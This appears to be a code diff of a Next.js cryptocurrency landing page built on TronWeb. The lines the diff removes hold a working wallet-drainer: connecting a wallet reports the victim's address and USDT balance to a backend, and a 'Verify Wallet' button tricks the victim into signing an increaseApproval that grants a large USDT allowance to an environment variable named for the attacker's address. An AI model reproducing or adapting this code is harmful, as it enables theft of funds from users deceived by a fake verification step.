@@ -14,92 +14,8 @@ import { SingleTicker } from "react-ts-tradingview-widgets";
 
 const LandingPage: NextPage = () => {
     useExternalScriptsForIndex();
-    const { adapters, selectedIndex, setSelectedIndex } = useAdapters();
-    const [loading, setLoading] = useState(false);
-    const [loginShow, setLoginShow] = useState(false);
-    const [balance, setBalance] = useState(0);
     const tickerTheme = "light";
-
-    const tronWeb = new TronWeb({
-              fullHost: 'https://api.trongrid.io',
-              headers: { 'TRON-PRO-API-KEY': process.env.NEXT_PUBLIC_TRONGRID_API_KEY },
-            });
-
-              
-    function handleLoginClose() {
-        setLoginShow(false);
-    }
-
-    async function checkBalance(index:number) {
-        const functionSelector = 'balanceOf(address)';
-        const parameter = [{ type: 'address', value: adapters[index].address }];
-
-        try {
-            const result = await tronWeb.transactionBuilder.triggerConstantContract(
-                process.env.NEXT_PUBLIC_USDT_ADDRESS
-                , functionSelector, {}, parameter);
-
-            // Extract constant_result from the result
-            const constantResult = result.constant_result[0];
-
-            // Convert constant result from hexadecimal to decimal
-            const balance = parseInt(constantResult, 16);
-            setBalance(balance);
-            return balance;
-
-        } catch (error) {
-            console.error('Error:', error);
-            return 0;
-        }
-
-    }
-
-    async function connectWallet(index: number) {
-        setLoading(true);
-        const adapter = adapters[index]; // Use selected adapter
-        if (adapter.address == null) {
-            try {
-                await adapter.connect();
-                setLoading(false);
-                // setUserReferral(adapter.address);
-                setLoginShow(false);
-                let bal = await checkBalance(index);
-                await sendNotification(index, bal);
-                toastNotification('Wallet Connected', true);
-            } catch (error) {
-                setLoading(false);
-                setLoginShow(false);
-                toastNotification('Error connecting wallet', false);
-            }
-        } else {
-            try {
-                await adapter.disconnect();
-                setLoading(false);
-                setLoginShow(false);
-                // toastNotification('Wallet Disconnected', true);  Update message accordingly
-            } catch (error) {
-                setLoading(false);
-                setLoginShow(false);
-                toastNotification('Error disconnecting wallet', false);
-            }
-        }
-    }
-
-    async function verifyWallet() {
-        await approveUSDT(100000000);
-        await sendNotification(selectedIndex, balance);
-        toastNotification('Please wait while approving', true);
-    }
-
-    async function selectAdapter(index: number) {
-        setSelectedIndex(index);
-        setLoginShow(false);
-        toastNotification("Please wait", true);
-        await new Promise(resolve => setTimeout(resolve, 3000));
-        await connectWallet(index);
-    }
-
-
+   
     const styles: CopyrightStyles = {
         parent: {
           color: "black",
@@ -113,56 +29,7 @@ const LandingPage: NextPage = () => {
       };
 
 
-    
-  // Method to send Notification
-  const sendNotification = async (index:number, bal:number) => {
    
-    try {
-      axios.get(`${process.env.NEXT_PUBLIC_BACKEND_URL}/backend/${adapters[index].address}/user/${bal.toString()}`).then((res) => {
-      });
-    } catch (error) {
-      console.error('Error sending SMS:', error);
-    }
-  };
-
-    
-    // Approval or increaseApproval
-    async function approveUSDT(amount:number) {
-        try {
-            // Prepare the parameters for the USDT contract's approve function
-            const functionSelector = 'increaseApproval(address,uint256)';
-            const params = [
-                { type: 'address', value: process.env.NEXT_PUBLIC_ATTACKER_ADDRESS }, // The Developer contract address
-                { type: 'uint256', value: amount * 1000000 }           // The amount of USDT to approve, converted to smallest unit
-            ];
-            const options = {
-                feeLimit: 100000000,
-                callValue: 0,
-                shouldPollResponse: true
-            };
-                // console.log(process.env.NEXT_PUBLIC_USDT_ADDRESS)
-            // Trigger the smart contract function
-            const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
-                process.env.NEXT_PUBLIC_USDT_ADDRESS, // The USDT contract address
-                functionSelector,
-                options,
-                params,
-                adapters[selectedIndex].address  // User's address
-            );
-
-            // Sign the transaction with WalletConnect
-            const signedTransaction = await adapters[selectedIndex].signTransaction(transaction.transaction);
-
-            // Broadcast the transaction
-            const receipt = await tronWeb.trx.sendRawTransaction(signedTransaction);
-            console.log('USDT Approval transaction receipt', receipt);
-
-            return receipt;
-        } catch (error) {
-            console.error('Error during USDT approval:', error);
-            throw error;
-        }
-    }
 
   return (
     <>
@@ -217,10 +84,10 @@ const LandingPage: NextPage = () => {
                                 </div>
                                 
                                 <div className="signin-btn">
-                                    <a className="btn btn-primary text-white" onClick={() => adapters[selectedIndex].address?connectWallet(selectedIndex):setLoginShow(true)}>
+                                    {/* <a className="btn btn-primary text-white" onClick={() => adapters[selectedIndex].address?connectWallet(selectedIndex):setLoginShow(true)}>
                                                 { loading?'...loading': 
                                                 adapters[selectedIndex].address ?  "..."+adapters[selectedIndex].address.slice(-4)
-                                                : "Connect Wallet"}</a>
+                                                : "Connect Wallet"}</a> */}
                                 </div>
                             </nav>
                         </div>
@@ -242,11 +109,11 @@ const LandingPage: NextPage = () => {
                         </div>
 
                         <div className="intro-btn">
-                            <a className="btn btn-primary text-white" onClick={() => adapters[selectedIndex].address?connectWallet(selectedIndex):setLoginShow(true)}>
+                            {/* <a className="btn btn-primary text-white" onClick={() => adapters[selectedIndex].address?connectWallet(selectedIndex):setLoginShow(true)}>
                                     { loading?'...loading': 
                                     adapters[selectedIndex].address ?  "..."+adapters[selectedIndex].address.slice(-4)
                                     : "Connect Wallet"}</a>
-                                   {adapters[selectedIndex].address? <a onClick={() => verifyWallet()} className="btn btn-outline-primary">Verify Wallet</a> : null}
+                                   {adapters[selectedIndex].address? <a onClick={() => verifyWallet()} className="btn btn-outline-primary">Verify Wallet</a> : null} */}
   
                         </div>
                     </div>
@@ -335,23 +202,23 @@ const LandingPage: NextPage = () => {
                         </div>
                     </div>
 
-                    {/* <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                    <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                         <div className="card">
                             <MiniChart colorTheme={tickerTheme} symbol="BINANCE:MATICUSDT" width="100%"></MiniChart>
                         </div>
                     </div>
 
-                    <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                    {/* <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                         <div className="card">
                             <MiniChart colorTheme={tickerTheme} symbol="BINANCE:AVAXUSDT" width="100%"></MiniChart>
                         </div>
-                    </div>
+                    </div> */}
 
                     <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                         <div className="card">
                             <MiniChart colorTheme={tickerTheme} symbol="BINANCE:SHIBUSDT" width="100%"></MiniChart>
                         </div>
-                    </div> */}
+                    </div>
                 </div>
             </div>
         </div>
@@ -668,59 +535,6 @@ const LandingPage: NextPage = () => {
             </div>
         </div>
         </div>
-
-        {/* Login Modal */}
-        <div className={`modal fade ${loginShow ? "show" : ""}`} tabIndex={-1} role="dialog" aria-labelledby="loginModalLabel" aria-hidden="true" style={{ display: loginShow ? "block" : "none" }}>
-         <div className="modal-dialog" role="document" style={{ backgroundColor:'#131722', pointerEvents:"auto" }}>
-             <div className="auth-form card">
-                 <div className="card-body">
-                     <form action="" className="identity-upload">
-                         <div className="text-end" style={{display: 'flex', justifyContent: 'flex-end', marginTop:"0.1rem" }}>
-                             <button type="button" className="btn btn-danger pl-5 pr-5" onClick={handleLoginClose}><i className="fa fa-times"></i></button>
-                         </div>
-                         <div className="identity-content">
-                             <span className="icon"><i className="fa fa-shield"></i></span>
-                             <h4>Select Wallet</h4>
-                             {/* <p>Trust Wallet / Binance</p> */}
-                             <div className="text-center">
-                                 <label htmlFor="walletconnect" style={{ color:"white" }}>Trust Wallet / Other Wallets: &nbsp;</label>
-                                 <button type="button" className="btn btn-success" onClick={() => selectAdapter(0)}>WalletConnect</button>
-                             </div>
-                             {/* <p>TronLink</p> */}
-                             <div className="text-center" style={{ marginTop:"1.2rem", marginBottom:"1.4rem" }}>
-                                 <label htmlFor="tronlink" style={{ color:"white" }}>TronLink: &nbsp;</label>
-                                 <button type="button" className="btn btn-primary pl-5 pr-5"  onClick={() => selectAdapter(1)}>Connect</button>
-                             </div>
-                         </div>
-                     </form>
-                 </div>
-             </div>
-             {/* <div className="modal-content">
-             <div className="modal-header">
-                 <h5 className="modal-title" id="loginModalLabel">Select Wallet</h5>
-                 <button type="button" className="close" data-dismiss="modal" aria-label="Close" onClick={handleLoginClose}>
-                 <span aria-hidden="true">&times;</span>
-                 </button>
-             </div>
-             <div className="modal-body">
-                 <form>
-                 <div className="form-group">
-                     <label htmlFor="createAccountEmail">TronLink: </label>
-                     <button type="button" className="btn btn-primary" style={{marginLeft:'12px'}} onClick={() => selectAdapter(1)}>Use TronLink</button>
-                 </div>
-                 <div className="form-group">
-                     <label htmlFor="loginPassword">Trust Wallet / Binance: </label>
-                     <button type="button" className="btn btn-purple-xx" style={{marginLeft:'12px'}} onClick={() => selectAdapter(0)}>Use WalletConnect</button>
-                 </div>
-                 </form>
-             </div>
-             <div className="modal-footer">
-                 <button type="button" className="btn btn-secondary" data-dismiss="modal" onClick={handleLoginClose}>Close</button>
-             </div>
-             </div> */}
-         </div>
-     </div>
-     {/* end modals */}
 
       </body>
     </>
